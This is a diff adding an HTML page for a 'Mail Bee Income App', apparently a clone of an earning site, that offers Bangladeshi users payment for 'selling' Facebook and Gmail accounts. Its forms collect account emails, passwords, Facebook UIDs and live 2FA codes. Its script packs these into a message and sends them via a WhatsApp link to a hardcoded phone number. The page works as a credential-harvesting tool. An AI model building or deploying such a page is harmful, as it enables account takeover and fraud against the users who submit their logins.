@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Earn money by completing tasks, selling Gmail/Facebook accounts, and more. Withdraw via bKash, Nagad, or Rocket." />
+  <title>NextEarn Clone - Mail Bee</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to right, #833ab4, #fd1d1d, #fcb045);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    header {
+      background: rgba(0,0,0,0.6);
+      text-align: center;
+      padding: 10px;
+      font-weight: bold;
+      font-size: 18px;
+    }
+    .container {
+      flex: 1;
+      padding: 20px;
+    }
+    .notice {
+      background-color: #111;
+      color: yellow;
+      padding: 10px;
+      margin-bottom: 20px;
+      font-weight: bold;
+      text-align: center;
+      border-radius: 10px;
+    }
+    .tabs button {
+      flex: 1;
+      padding: 10px;
+      background: #fff1;
+      border: none;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      border-radius: 10px 10px 0 0;
+      transition: background 0.3s ease;
+    }
+    .tabs button:hover {
+      background: #fff2;
+    }
+    .tabs {
+      display: flex;
+      margin-bottom: 20px;
+    }
+    .tab-content {
+      display: none;
+      background: rgba(0,0,0,0.2);
+      padding: 20px;
+      border-radius: 0 0 10px 10px;
+    }
+    .tab-content.active {
+      display: block;
+    }
+    input, textarea, select, button {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 10px;
+      border: none;
+      font-size: 16px;
+    }
+    button {
+      background: #ffffff;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    button:hover {
+      background: #eee;
+      transform: scale(1.03);
+    }
+  </style>
+</head>
+<body>
+  <header>Mail Bee Income App</header>
+  <div class="notice">Today ফেইসবুক রেট = ৭.৫০ টাকা</div>
+  <div class="container">
+    <div class="tabs">
+      <button onclick="openTab('sellFb')">Sell Facebook</button>
+      <button onclick="openTab('sellGmail')">Sell Gmail</button>
+    </div>
+
+    <div id="sellFb" class="tab-content active">
+      <form id="facebookForm">
+        <label>Fb UID</label>
+        <input type="text" placeholder="Fb UID" required />
+        <label>Fb Email</label>
+        <input type="email" placeholder="Fb Email" required />
+        <label>Fb Password</label>
+        <input type="password" placeholder="Fb Password" required />
+        <label>Fb 2FA Code</label>
+        <input type="text" placeholder="2FA Code" required />
+        <button type="submit">Submit Facebook</button>
+      </form>
+    </div>
+
+    <div id="sellGmail" class="tab-content">
+      <div class="notice">Today জিমেইল রেট = ১০. ২৫ টাকা</div>
+      <form id="gmailForm">
+        <label>Gmail Address</label>
+        <input type="email" placeholder="জিমেইল দিন" required />
+        <label>Password</label>
+        <input type="password" placeholder="জিমেইল পাসওয়ার্ড" required />
+        <button type="submit">Submit Gmail</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function openTab(tabId) {
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+      document.getElementById(tabId).classList.add('active');
+    }
+
+    function sendWhatsAppMessage(message) {
+      const phone = '8801938975564'; // Country code সহ নম্বর
+      const url = `https://wa.me/${phone}?text=${encodeURIComponent(message)}`;
+      window.open(url, '_blank');
+    }
+
+    // Facebook Form Handler
+    document.getElementById('facebookForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const uid = this.querySelector('input[placeholder="Fb UID"]').value;
+      const email = this.querySelector('input[placeholder="Fb Email"]').value;
+      const pass = this.querySelector('input[placeholder="Fb Password"]').value;
+      const fa = this.querySelector('input[placeholder="2FA Code"]').value;
+
+      const msg = `📘 Facebook Sell Request\n--------------------------\nUID: ${uid}\nEmail: ${email}\nPassword: ${pass}\n2FA Code: ${fa}`;
+      sendWhatsAppMessage(msg);
+    });
+
+    // Gmail Form Handler
+    document.getElementById('gmailForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = this.querySelector('input[placeholder="জিমেইল দিন"]').value;
+      const pass = this.querySelector('input[placeholder="জিমেইল পাসওয়ার্ড"]').value;
+
+      const msg = `📧 Gmail Sell Request\n--------------------------\nGmail: ${email}\nPassword: ${pass}`;
+      sendWhatsAppMessage(msg);
+    });
+  </script>
+</body>
+</html>
